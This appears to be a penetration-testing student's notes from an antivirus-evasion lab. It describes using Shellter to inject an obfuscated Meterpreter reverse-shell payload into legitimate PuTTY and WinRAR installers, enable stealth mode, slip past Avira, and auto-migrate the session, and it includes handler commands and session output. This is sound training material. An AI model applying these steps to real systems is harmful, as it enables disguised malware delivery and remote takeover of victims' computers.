---
id: tools-apache2
tags: ["kali", "tool", "exfiltration", "secure"]
created: 2023-01-12 11:56
---
# tools-apache2

backlinks: [[]]

sources:

---

- default log path - /var/log/apache2/


```shell
# from lab

get  32-bit x86: putty.exe (signature) 
https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe

shellter
operation mode = A

/home/kali/Documents/git/bravo/offsec/pen200/17-AntivirusEvasion/portaputty.exe
enable stealth mode = Y

1 meterpreter_reverse_tcp

192.168.119.125
4444

Injection: verified


exi

run post/windows/manage/migrate

shell

```



```shell
# start the service
sudo systemctrl start apache2

# watch traffic on the apache2 access log
sudo watch -n 5 cat /var/log/apache2/access.log

```


Shellter is a dynamic shellcode injection tool and one of the most popular free tools capable of bypassing antivirus software. It uses a number of novel and advanced techniques to essentially backdoor a valid and non-malicious executable file with a malicious shellcode payload.

While the details of the techniques Shellter uses are beyond the scope of this module, it essentially performs a thorough analysis of the target PE file and the execution paths. It then determines where it can inject our shellcode, without relying on traditional injection techniques that are easily caught by AV engines. Those include changing of PE file section permissions, creating new sections, and so on.

Finally, Shellter attempts to use the existing PE Import Address Table (IAT)9 entries to locate functions that will be used for the memory allocation, transfer, and execution of our payload.


```shell

apt-cache search shellter

sudo apt install shellter

apt install wine

#to execute run 
shellter

#In Manual mode, the tool will launch the PE we want to use for injection and allow us to manipulate it on a more granular level. 

# Next, we must select a target PE. Shellter will analyze and alter the execution flow to inject and execute our payload. For this example, we will use the 32-bit trial executable installer for the popular WinRAR11 utility as our target PE. Before analyzing and altering the original PE in any way, Shellter will first create a backup of the file:

#As soon as Shellter finds a suitable place to inject our payload, it will ask us if we want to enable Stealth Mode,12 which will attempt to restore the execution flow of the PE after our payload has been executed. We will choose to enable Stealth Mode as we would like the WinRAR installer to behave normally in order to avoid any suspicion.

#At this point, we are presented with the list of available payloads. These include popular selections such as meterpreter but Shellter also supports custom payloads.

#After selecting the payload, we are presented with the default options from Metasploit, such as the reverse shell host (LHOST) and port (LPORT):
#With all parameters set, Shellter will inject the payload into the WinRAR installer and attempt to reach the first instruction of the payload.
#Now that the test succeeded, before transferring over the malicious PE file to our Windows client, we will configure a listener on our Kali machine to interact with the meterpreter payload.

#Since Shellter obfuscates both the payload as well as the payload decoder before injecting them into the PE, Avira's signature-based scan runs cleanly. It does not consider the binary malicious.

#Once we execute the file, we are presented with the default WinRAR installation window, which will install the software normally without any issues. Looking back at our handler shows that we successfully received a Meterpreter session but the session appears to die after the installation either finishes or is cancelled:

#This makes sense because the installer execution has completed and the process has been terminated. In order to overcome this problem, we can set up an AutoRunScript to migrate our Meterpreter to a separate process immediately after session creation. If we re-run the WinRAR setup file after this change to our listener instance, we should receive a different result:

msf exploit(multi/handler) > set AutoRunScript post/windows/manage/migrate
AutoRunScript => post/windows/manage/migrate

msf exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.11.0.4:4444 
[*] Sending stage (179779 bytes) to 10.11.0.22
[*] Meterpreter session 4 opened (10.11.0.4:4444 -> 10.11.0.22:51371)
[*] Session ID 4 (10.11.0.4:4444 -> 10.11.0.22:51371) processing AutoRunScript 'post/windows/manage/migrate'
[*] Running module against DESKTOP-T27O4CT
[*] Current server process: wrar550.exe (4036)
[*] Spawning notepad.exe process to migrate to
[+] Migrating to 4832
[+] Successfully migrated to process 4832

meterpreter > getuid
Server username: DESKTOP-T27O4CT\offsec


#After the migration completes, the session will remain active even after we complete the WinRAR installation process or cancel it.